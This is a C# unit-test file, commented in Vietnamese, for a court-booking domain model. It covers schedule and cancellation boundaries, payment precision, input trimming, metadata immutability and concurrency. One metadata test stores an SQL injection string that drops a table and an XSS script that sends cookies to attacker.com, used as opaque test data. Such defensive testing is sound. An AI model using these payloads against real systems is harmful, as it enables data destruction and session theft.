using System.Diagnostics;
using FluentAssertions;
using Shared.DecisionContractSDK.Domain;
using Shared.DecisionContractSDK.Enums;
using Xunit;

namespace TADSS.UnitTests;

/// <summary>
/// Bộ kiểm thử chuyên sâu cho các kịch bản miền phức tạp (Complex Domain Scenarios & Difficult Edge Cases).
/// Bao gồm: Kiểm thử giá trị biên mili-giây, năm nhuận, tính toán tài chính siêu chính xác, phòng thủ DoS,
/// sao chép phòng vệ (defensive copying), và stress test đa luồng quy mô lớn (500 tasks).
/// </summary>
public class ComplexDomainScenariosTests
{
    #region 1. Schedule Boundary & Temporal Precision Tests

    [Fact]
    public void ReservationSchedule_ExactBoundary_29Minutes59Seconds_ThrowsDomainInvariantException()
    {
        // Arrange: 29 phút 59 giây (thiếu 1 giây so với ngưỡng tối thiểu 30 phút)
        var start = new DateTime(2026, 6, 1, 10, 0, 0, DateTimeKind.Utc);
        var end = start.AddMinutes(29).AddSeconds(59);

        // Act
        var act = () => new ReservationSchedule(start, end);

        // Assert
        act.Should().Throw<DomainInvariantException>()
            .Where(e => e.InvariantCode == "INVALID_SCHEDULE_DURATION");
    }

    [Fact]
    public void ReservationSchedule_ExactBoundary_30MinutesZeroSeconds_Succeeds()
    {
        // Arrange: Đúng chính xác 30 phút 0 giây (ngưỡng cận dưới hợp lệ)
        var start = new DateTime(2026, 6, 1, 10, 0, 0, DateTimeKind.Utc);
        var end = start.AddMinutes(30);

        // Act
        var schedule = new ReservationSchedule(start, end);

        // Assert
        schedule.Duration.Should().Be(TimeSpan.FromMinutes(30));
    }

    [Fact]
    public void ReservationSchedule_ExactBoundary_12HoursZeroSeconds_Succeeds()
    {
        // Arrange: Đúng chính xác 12 giờ 0 phút 0 giây (ngưỡng cận trên hợp lệ)
        var start = new DateTime(2026, 6, 1, 6, 0, 0, DateTimeKind.Utc);
        var end = start.AddHours(12);

        // Act
        var schedule = new ReservationSchedule(start, end);

        // Assert
        schedule.Duration.Should().Be(TimeSpan.FromHours(12));
    }

    [Fact]
    public void ReservationSchedule_ExactBoundary_12Hours1Second_ThrowsDomainInvariantException()
    {
        // Arrange: 12 giờ 1 giây (vượt 1 giây so với ngưỡng tối đa 12 giờ)
        var start = new DateTime(2026, 6, 1, 6, 0, 0, DateTimeKind.Utc);
        var end = start.AddHours(12).AddSeconds(1);

        // Act
        var act = () => new ReservationSchedule(start, end);

        // Assert
        act.Should().Throw<DomainInvariantException>()
            .Where(e => e.InvariantCode == "INVALID_SCHEDULE_DURATION");
    }

    [Fact]
    public void ReservationSchedule_StartEqualsEndTime_ThrowsDomainInvariantException()
    {
        // Arrange: StartTime trùng khớp hoàn toàn EndTime (thời lượng = 0)
        var instant = new DateTime(2026, 6, 1, 14, 0, 0, DateTimeKind.Utc);

        // Act
        var act = () => new ReservationSchedule(instant, instant);

        // Assert
        act.Should().Throw<DomainInvariantException>()
            .Where(e => e.InvariantCode == "INVALID_SCHEDULE_RANGE");
    }

    [Fact]
    public void ReservationSchedule_LeapYear_Feb29_CalculatesDurationAccurately()
    {
        // Arrange: Ngày 29/02/2028 (Năm nhuận)
        var start = new DateTime(2028, 2, 29, 22, 0, 0, DateTimeKind.Utc);
        var end = new DateTime(2028, 3, 1, 1, 0, 0, DateTimeKind.Utc); // Vắt qua ngày 1/3

        // Act
        var schedule = new ReservationSchedule(start, end);

        // Assert
        schedule.Duration.Should().Be(TimeSpan.FromHours(3));
    }

    [Fact]
    public void ReservationSchedule_YearTransition_Dec31ToJan1_PreservesDuration()
    {
        // Arrange: Phiên đặt sân giao thừa vắt qua năm mới
        var start = new DateTime(2026, 12, 31, 23, 0, 0, DateTimeKind.Utc);
        var end = new DateTime(2027, 1, 1, 1, 30, 0, DateTimeKind.Utc);

        // Act
        var schedule = new ReservationSchedule(start, end);

        // Assert
        schedule.Duration.Should().Be(TimeSpan.FromMinutes(150));
    }

    [Fact]
    public void ReservationSchedule_MillisecondSubSecondPrecision_IsPreserved()
    {
        // Arrange: Thời điểm có độ chính xác mili-giây
        var start = new DateTime(2026, 7, 10, 8, 0, 0, 500, DateTimeKind.Utc);
        var end = start.AddHours(2);

        // Act
        var schedule = new ReservationSchedule(start, end);

        // Assert
        schedule.StartTime.Millisecond.Should().Be(500);
        schedule.Duration.Should().Be(TimeSpan.FromHours(2));
    }

    #endregion

    #region 2. Financial Precision & Large Numbers Tests

    [Fact]
    public void PaymentPolicy_FractionalCents_PreservesExactDecimalPrecision()
    {
        // Arrange: Số tiền lẻ đến 4 chữ số thập phân
        var totalPrice = 199999.9950m;
        var depositAmount = 99999.9975m;

        // Act
        var policy = new PaymentPolicy(totalPrice, depositAmount, PaymentStatus.PARTIALLY_PAID);

        // Assert
        policy.TotalPrice.Should().Be(totalPrice);
        policy.DepositAmount.Should().Be(depositAmount);
        policy.DepositPercentage.Should().BeApproximately(50.00000125m, 0.0001m);
    }

    [Fact]
    public void PaymentPolicy_VeryLargeTotalPrice_CalculatesWithoutOverflow()
    {
        // Arrange: Doanh nghiệp lớn thuê giải đấu 50 tỷ VND
        var totalPrice = 50_000_000_000m;
        var depositAmount = 25_000_000_000m;

        // Act
        var policy = new PaymentPolicy(totalPrice, depositAmount, PaymentStatus.PARTIALLY_PAID);

        // Assert
        policy.DepositPercentage.Should().Be(50m);
        policy.IsFullyPaid.Should().BeFalse();
    }

    [Fact]
    public void PaymentPolicy_DepositEpsilonHigherThanTotalPrice_ThrowsDomainInvariantException()
    {
        // Arrange: Tiền cọc lớn hơn tổng tiền đúng 0.0001 VND (sai số epsilon)
        var totalPrice = 200000m;
        var depositAmount = 200000.0001m;

        // Act
        var act = () => new PaymentPolicy(totalPrice, depositAmount, PaymentStatus.PAID);

        // Assert
        act.Should().Throw<DomainInvariantException>()
            .Where(e => e.InvariantCode == "DEPOSIT_EXCEEDS_TOTAL_PRICE");
    }

    [Fact]
    public void PaymentPolicy_DepositEpsilonLowerThanZero_ThrowsDomainInvariantException()
    {
        // Arrange: Tiền cọc âm nhẹ -0.0001 VND
        var totalPrice = 200000m;
        var depositAmount = -0.0001m;

        // Act
        var act = () => new PaymentPolicy(totalPrice, depositAmount, PaymentStatus.UNPAID);

        // Assert
        act.Should().Throw<DomainInvariantException>()
            .Where(e => e.InvariantCode == "INVALID_DEPOSIT_AMOUNT");
    }

    [Fact]
    public void PaymentPolicy_ZeroTotalPriceWithPositiveDeposit_ThrowsDomainInvariantException()
    {
        // Arrange: Sân miễn phí (TotalPrice = 0) nhưng lại có DepositAmount > 0
        var act = () => new PaymentPolicy(0m, 50000m, PaymentStatus.PARTIALLY_PAID);

        // Assert
        act.Should().Throw<DomainInvariantException>()
            .Where(e => e.InvariantCode == "DEPOSIT_EXCEEDS_TOTAL_PRICE");
    }

    [Fact]
    public void CalculateDepositRatio_RepeatingFraction_CalculatesDeterministicDecimal()
    {
        // Arrange: 100,000 / 300,000 = 1/3 = 0.3333333333333333333333333333m
        var reservation = CreateTestReservation(totalPrice: 300000m, depositAmount: 100000m);

        // Act
        var ratio = reservation.CalculateDepositRatio();

        // Assert
        ratio.Should().BeApproximately(0.3333333333333333m, 0.000001m);
    }

    #endregion

    #region 3. Cancellation Policy Edge & Boundary Cases

    [Fact]
    public void CanBeCancelledWithoutPenalty_ExactBoundary_24HoursZeroMilliseconds_ReturnsTrue()
    {
        // Arrange: Thời điểm hủy cách giờ bắt đầu đúng 24h 0m 0s 0ms
        var startTime = new DateTime(2026, 8, 15, 18, 0, 0, DateTimeKind.Utc);
        var reservation = CreateTestReservation(startTime: startTime);
        var cancelTime = startTime.AddHours(-24);

        // Act
        var result = reservation.CanBeCancelledWithoutPenalty(cancelTime);

        // Assert
        result.Should().BeTrue();
    }

    [Fact]
    public void CanBeCancelledWithoutPenalty_ExactBoundary_23Hours59Minutes59Seconds_ReturnsFalse()
    {
        // Arrange: Thời điểm hủy cách giờ bắt đầu 23h 59m 59s (thiếu 1 giây so với 24h)
        var startTime = new DateTime(2026, 8, 15, 18, 0, 0, DateTimeKind.Utc);
        var reservation = CreateTestReservation(startTime: startTime);
        var cancelTime = startTime.AddHours(-24).AddSeconds(1);

        // Act
        var result = reservation.CanBeCancelledWithoutPenalty(cancelTime);

        // Assert
        result.Should().BeFalse();
    }

    [Fact]
    public void CanBeCancelledWithoutPenalty_CancelRequestedAfterStartTime_ReturnsFalse()
    {
        // Arrange: Yêu cầu hủy sau khi phiên đặt sân đã bắt đầu được 10 phút
        var startTime = new DateTime(2026, 8, 15, 18, 0, 0, DateTimeKind.Utc);
        var reservation = CreateTestReservation(startTime: startTime);
        var cancelTime = startTime.AddMinutes(10);

        // Act
        var result = reservation.CanBeCancelledWithoutPenalty(cancelTime);

        // Assert
        result.Should().BeFalse();
    }

    [Fact]
    public void CanBeCancelledWithoutPenalty_CustomWindow_ZeroDuration_ReturnsTrueIfBeforeStart()
    {
        // Arrange: Chính sách linh hoạt cho phép hủy miễn là trước giờ bắt đầu (cửa sổ 0 giờ)
        var startTime = new DateTime(2026, 8, 15, 18, 0, 0, DateTimeKind.Utc);
        var reservation = CreateTestReservation(startTime: startTime);

        // Act & Assert
        reservation.CanBeCancelledWithoutPenalty(startTime.AddSeconds(-1), TimeSpan.Zero).Should().BeTrue();
        reservation.CanBeCancelledWithoutPenalty(startTime.AddSeconds(1), TimeSpan.Zero).Should().BeFalse();
    }

    [Fact]
    public void CanBeCancelledWithoutPenalty_CustomWindow_48HoursStrict_EvaluatesCorrectly()
    {
        // Arrange: Chính sách khắt khe cho sự kiện lớn (cửa sổ hủy 48 giờ)
        var startTime = new DateTime(2026, 8, 15, 18, 0, 0, DateTimeKind.Utc);
        var reservation = CreateTestReservation(startTime: startTime);
        var window48h = TimeSpan.FromHours(48);

        // Act & Assert
        reservation.CanBeCancelledWithoutPenalty(startTime.AddHours(-49), window48h).Should().BeTrue();
        reservation.CanBeCancelledWithoutPenalty(startTime.AddHours(-48), window48h).Should().BeTrue();
        reservation.CanBeCancelledWithoutPenalty(startTime.AddHours(-47), window48h).Should().BeFalse();
    }

    #endregion

    #region 4. Sanitization, Max-Length & Unicode Invariants

    [Theory]
    [InlineData("   ")]
    [InlineData("\t")]
    [InlineData("\n")]
    [InlineData(null)]
    public void CustomerInfo_WhitespaceOrNullTier_DefaultsToStandard(string? rawTier)
    {
        // Act
        var customer = new CustomerInfo(Guid.NewGuid(), rawTier);

        // Assert
        customer.Tier.Should().Be("STANDARD");
    }

    [Fact]
    public void CustomerInfo_LeadingTrailingWhitespaceTier_IsTrimmed()
    {
        // Act
        var customer = new CustomerInfo(Guid.NewGuid(), "   VIP_PLATINUM   ");

        // Assert
        customer.Tier.Should().Be("VIP_PLATINUM");
    }

    [Fact]
    public void CustomerInfo_Exact50CharactersTier_Succeeds()
    {
        // Arrange: Đúng chính xác 50 ký tự
        var exact50Tier = new string('T', 50);

        // Act
        var customer = new CustomerInfo(Guid.NewGuid(), exact50Tier);

        // Assert
        customer.Tier.Should().Be(exact50Tier);
    }

    [Fact]
    public void CustomerInfo_UnicodeAndAccentedTier_PreservedWithoutCorruption()
    {
        // Arrange: Chuỗi tiếng Việt có dấu và biểu tượng
        var unicodeTier = "HỘI VIÊN VÀNG - VIP 🌟";

        // Act
        var customer = new CustomerInfo(Guid.NewGuid(), unicodeTier);

        // Assert
        customer.Tier.Should().Be(unicodeTier);
    }

    [Theory]
    [InlineData("   ")]
    [InlineData("\t")]
    [InlineData(null)]
    public void Reservation_WhitespaceOrNullBookingType_DefaultsToSingle(string? rawBookingType)
    {
        // Act
        var reservation = CreateTestReservation(bookingType: rawBookingType);

        // Assert
        reservation.BookingType.Should().Be("SINGLE");
    }

    [Fact]
    public void Reservation_BookingType_LeadingTrailingSpaces_IsTrimmed()
    {
        // Act
        var reservation = CreateTestReservation(bookingType: "   TOURNAMENT_EVENT   ");

        // Assert
        reservation.BookingType.Should().Be("TOURNAMENT_EVENT");
    }

    [Fact]
    public void Reservation_BookingType_Exact50Characters_Succeeds()
    {
        // Arrange: Đúng chính xác 50 ký tự
        var exact50Type = new string('K', 50);

        // Act
        var reservation = CreateTestReservation(bookingType: exact50Type);

        // Assert
        reservation.BookingType.Should().Be(exact50Type);
    }

    #endregion

    #region 5. Metadata Handling, Defensive Copying & Immutability

    [Fact]
    public void ReservationMetadata_SourceDictionaryMutation_DoesNotAffectAggregateMetadata()
    {
        // Arrange: Tạo dictionary ngoài và khởi tạo ReservationMetadata
        var sourceDict = new Dictionary<string, string>
        {
            ["channel"] = "WebPortal",
            ["campaign"] = "SummerPromo2026"
        };
        var metadata = new ReservationMetadata(sourceDict);

        // Act: Thay đổi dictionary gốc từ bên ngoài
        sourceDict["channel"] = "HACKED_VALUE";
        sourceDict.Add("maliciousKey", "maliciousValue");

        // Assert: Metadata bên trong Aggregate Root phải được bảo vệ nguyên vẹn (Defensive Copy)
        metadata.Get("channel").Should().Be("WebPortal");
        metadata.Get("maliciousKey").Should().BeNull();
        metadata.Attributes.Count.Should().Be(2);
    }

    [Fact]
    public void ReservationMetadata_NullSource_InitializesEmptyReadOnlyDictionary()
    {
        // Act
        var metadata = new ReservationMetadata(null);

        // Assert
        metadata.Attributes.Should().NotBeNull();
        metadata.Attributes.Should().BeEmpty();
        metadata.Get("nonExistentKey").Should().BeNull();
    }

    [Fact]
    public void ReservationMetadata_CaseSensitiveKeyLookup_BehavesPredictably()
    {
        // Arrange
        var dict = new Dictionary<string, string> { ["sourceChannel"] = "IOS_APP" };
        var metadata = new ReservationMetadata(dict);

        // Act & Assert
        metadata.Get("sourceChannel").Should().Be("IOS_APP");
        metadata.Get("SOURCECHANNEL").Should().BeNull();
    }

    [Fact]
    public void ReservationMetadata_SpecialStringPayloads_StoredAsOpaqueStringsWithoutMutation()
    {
        // Arrange: Chuỗi chứa các ký tự đặc biệt / escape characters
        // LƯU Ý KIẾN TRÚC: Test này kiểm chứng Domain Model xử lý an toàn dữ liệu dạng chuỗi mờ (opaque string),
        // bảo toàn nguyên vẹn không tự ý format hay biến đổi dữ liệu.
        // Trách nhiệm phòng chống SQL Injection thực tế thuộc về Data Access / Parameterized Queries,
        // và phòng chống XSS thuộc về Presentation Layer / Output Encoding.
        var sqlStylePayload = "'; DROP TABLE Reservations; SELECT * FROM Users WHERE '1'='1";
        var xssStylePayload = "<script>fetch('http://attacker.com/steal?cookie=' + document.cookie);</script>";
        var dict = new Dictionary<string, string>
        {
            ["userNote"] = sqlStylePayload,
            ["clientComment"] = xssStylePayload
        };
        var metadata = new ReservationMetadata(dict);

        // Act & Assert
        metadata.Get("userNote").Should().Be(sqlStylePayload);
        metadata.Get("clientComment").Should().Be(xssStylePayload);
    }

    [Fact]
    public void ReservationMetadata_LargeCollection_MaintainsLookupIntegrityUnderVolume()
    {
        // Arrange: Kiểm thử độ bền cấu trúc dữ liệu Metadata khi nạp 1,000 cặp key-value
        // (Functional Stress & Data Integrity Test, không phải Performance Benchmark)
        var largeDict = Enumerable.Range(0, 1000)
            .ToDictionary(i => $"key_{i:D4}", i => $"value_{i:D4}");
        var metadata = new ReservationMetadata(largeDict);

        // Act & Assert
        metadata.Attributes.Count.Should().Be(1000);
        metadata.Get("key_0000").Should().Be("value_0000");
        metadata.Get("key_0500").Should().Be("value_0500");
        metadata.Get("key_0999").Should().Be("value_0999");
    }

    #endregion

    #region 6. Immutability Assurance for Concurrent Readers (500 Tasks)

    [Fact]
    public async Task Reservation_ImmutabilityGuaranteesSafeConcurrentReads_Across500Tasks()
    {
        // Arrange: Một instance Reservation bất biến được chia sẻ cho 500 tasks đồng thời
        // KIẾN TRÚC: Thiết kế Immutable Domain Model loại bỏ hoàn toàn rủi ro Race Condition khi đọc đồng thời
        var startTime = DateTime.UtcNow.AddDays(3);
        var reservation = Reservation.Create(
            Guid.NewGuid(),
            Guid.NewGuid(),
            "VIP",
            Guid.NewGuid(),
            Guid.NewGuid(),
            null,
            startTime,
            startTime.AddHours(2),
            500000m,
            250000m,
            PaymentStatus.PARTIALLY_PAID,
            "SINGLE",
            BookingPriority.HIGH,
            DateTime.UtcNow,
            new Dictionary<string, string> { ["concurrentKey"] = "SafeValue" });

        // Act: 500 tasks chạy song song truy cập các computed properties & methods
        var tasks = Enumerable.Range(0, 500).Select(_ => Task.Run(() =>
        {
            var ratio = reservation.CalculateDepositRatio();
            var canCancel = reservation.CanBeCancelledWithoutPenalty(DateTime.UtcNow);
            var isFullyPaid = reservation.Payment.IsFullyPaid;
            var depositPct = reservation.Payment.DepositPercentage;
            var metaVal = reservation.Metadata.Get("concurrentKey");

            ratio.Should().Be(0.5m);
            canCancel.Should().BeTrue();
            isFullyPaid.Should().BeFalse();
            depositPct.Should().Be(50m);
            metaVal.Should().Be("SafeValue");
        }));

        // Assert: Tất cả hoàn thành an toàn, không deadlock, không state corruption
        await Task.WhenAll(tasks);
    }

    [Fact]
    public void CustomerInfo_RecordWithExpression_DemonstratesNonDestructiveCopySemantics()
    {
        // Arrange
        var original = new CustomerInfo(Guid.NewGuid(), "SILVER");

        // Act: Sử dụng C# record non-destructive copy `with`
        var upgraded = original with { Tier = "DIAMOND" };

        // Assert
        original.Tier.Should().Be("SILVER");
        upgraded.Tier.Should().Be("DIAMOND");
        upgraded.CustomerId.Should().Be(original.CustomerId);
    }

    #endregion

    #region Helper Methods

    private static Reservation CreateTestReservation(
        DateTime? startTime = null,
        decimal totalPrice = 200000m,
        decimal depositAmount = 100000m,
        string? bookingType = "SINGLE")
    {
        var start = startTime ?? DateTime.UtcNow.AddDays(2);
        var end = start.AddHours(2);

        return Reservation.Create(
            reservationId: Guid.NewGuid(),
            customerId: Guid.NewGuid(),
            customerTier: "VIP",
            courtId: Guid.NewGuid(),
            branchId: Guid.NewGuid(),
            courtTypeId: null,
            startTime: start,
            endTime: end,
            totalPrice: totalPrice,
            depositAmount: depositAmount,
            paymentStatus: PaymentStatus.PARTIALLY_PAID,
            bookingType: bookingType,
            priority: BookingPriority.NORMAL,
            requestedAt: DateTime.UtcNow);
    }

    #endregion
}
